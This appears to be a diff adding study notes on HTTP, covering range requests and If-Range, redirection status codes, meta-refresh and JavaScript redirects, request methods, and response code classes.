+            The If-Range HTTP request header makes a range request conditional: if the condition is fulfilled, the range request will be issued and the server sends back a 206 Partial Content answer with the appropriate body. If the condition is not fulfilled, the full resource is sent back, with a 200 OK status. This header can be used either with a Last-Modified validator, or with an ETag, but not with both.
+                If-Range: Wed, 21 Oct 2015 07:28:00 GMT
+
+    Partial request responses:
+        There are three relevant statuses, when working with range requests:
+            - In case of a successful range request, the 206 Partial Content status is sent back from a server.
+
+            - In case of a range request that is out of bounds (none of the range values overlap the extent of the resource, i.e first-byte-pos of all ranges is greater than the resource length), the server responds with a 416 Requested Range Not Satisfiable status.
+
+            - In case of no support of range requests, the 200 OK status is sent back from a server.
+
+    Comparison to chunked Transfer-Encoding:
+        The Transfer-Encoding header allows chunked encoding, which is useful when larger amounts of data are sent to the client and the total size of the response is not known until the request has been fully processed. The server sends data to the client straight away without buffering the response or determining the exact length, which leads to improved latency. Range requests and chunking are compatible and can be used with or without each other.
+
+Redirections in HTTP:
+    URL redirection, also known as URL forwarding, is a technique to give a page, a form, or a whole Web application, more than one URL address. HTTP provides a special kind of response, called HTTP redirect, to perform this operation and is used for numerous goals: temporary redirection while site maintenance is ongoing, permanent redirection to keep external links working after a change of the site's architecture, progress pages when uploading a file, and so on.
+
+    Principle:
+        In HTTP, a redirection is triggered by the server sending a special redirect response to a request. An HTTP redirect is a response with a status code of 3xx. A browser, when receiving a redirect response, uses the new URL provided and immediately loads it. Most of the time, besides a small performance hit, the redirection is transparent to the user.
+
+        There are several types of redirects and they fall into three categories: permanent, temporary and special redirections.
+
+        Permanent redirections:
+            These redirections are meant to last forever. They imply that the original URL should not be used anymore and that the new one is preferred. Search engine robots trigger an update of the associated URL for the resource in their indexes.
+                301 => Moved Permanently
+                308 => Permanent Redirect
+
+            The specification had no intent to allow method changes, but practically there are user agents out there doing this. 308 has been created to remove the ambiguity of the behavior when using non-GET methods.
+
+        Temporary redirections:
+            Sometimes the requested resource cannot be accessed from its canonical location, but it can be accessed from another place. In this case, a temporary redirect can be used. Search engine robots don't memorize the new, temporary link. Temporary redirections are also used when creating, updating and deleting resources to present temporary progress pages.
+                302 => Found
+                303 => See other
+                307 => Temporary Redirect
+
+        Special redirections:
+            In addition to these usual redirections, there are two specific redirections. The 304 (Not Modified) redirects a page to the locally cached copy (that was stale), and 300 (Multiple Choice) is a manual redirection: the body, presented by the browser as a Web page, lists the possible redirections and the user clicks on one to select it.
+                300 => Multiple Choice
+                304 => Not Modified
+
+    Alternative way of specifying redirections:
+        HTTP redirects aren't the only way to define redirections. There are two other methods: HTML redirections using the <meta> element, and JavaScript redirections using the DOM.
+
+        HTML redirections:
+            HTTP redirects are the preferred way to create redirections, but sometimes the Web developer doesn't have control over the server or cannot configure it. For these specific cases, the Web developers can craft an HTML page with a <meta> element and the http-equiv attribute set to refresh in the <head> of the page. When displaying the page, the browser will find this element and will go to the indicated page.
+                <head>
+                  <meta http-equiv="refresh" content="0; URL=http://www.example.com/" />
+                </head>
+
+            The content attribute starts with a number indicating how many seconds the browser should wait before redirecting to the given URL. Always set it to 0, for better accessibility.
+
+            Obviously, this method only works with HTML pages (or similar) and cannot be used for images or any other type of content.
+
+            Note that these redirections break the back button in a browser: you can go back to a page with this header but it instantaneously moves forward again.
+
+        JavaScript redirections:
+            Redirections in JavaScript are created by setting a value to the window.location property and the new page is loaded.
+                window.location = "http://www.example.com/";
+
+            Like HTML redirections, this can't work on all resources, and obviously, this will only work on clients that execute JavaScript. On the other side, there are more possibilities as you can trigger the redirection only if some conditions are met, for example.
+
+        Order of precedence:
+            With three possibilities for URL redirections, several methods can be specified at the same time, but which one is applied first? The order of precedence is the following:
+                1. HTTP redirects are always executed first when there is not even a page transmitted, and of course not even read.
+
+                2. HTML redirects (<meta>) are executed if there weren't any HTTP redirects.
+
+                3. JavaScript redirects are used as the last resort, and only if JavaScript is enabled on the client side.
+
+            When possible, use HTTP redirects, and don't add <meta> element redirects. If someone changes the HTTP redirects and forgets to change the HTML redirects the redirects will no longer be identical, which could cause an infinite loop or other nightmares.
+
+HTTP request methods:
+    GET:
+        The GET method requests a representation of the specified resource. Requests using GET should only retrieve data.
+
+    HEAD:
+        The HEAD method asks for a response identical to that of a GET request, but without the response body.
+
+    POST:
+        The POST method is used to submit an entity to the specified resource, often causing a change in state or side effects on the server.
+
+    PUT:
+        The PUT method replaces all current representations of the target resource with the request payload.
+
+    DELETE:
+        The DELETE method deletes the specified resource.
+
+    CONNECT:
+        The CONNECT method establishes a tunnel to the server identified by the target resource.
+
+    OPTIONS:
+        The OPTIONS method is used to describe the communication options for the target resource.
+
+    TRACE:
+        The TRACE method performs a message loop-back test along the path to the target resource.
+
+    PATCH:
+        The PATCH method is used to apply partial modifications to a resource.
+
+HTTP response status codes:
+    Responses are grouped in five classes:
+        1. Informational responses (100–199),
+        2. Successful responses (200–299),
+        3. Redirects (300–399),
+        4. Client errors (400–499),
+        5. and Server errors (500–599).
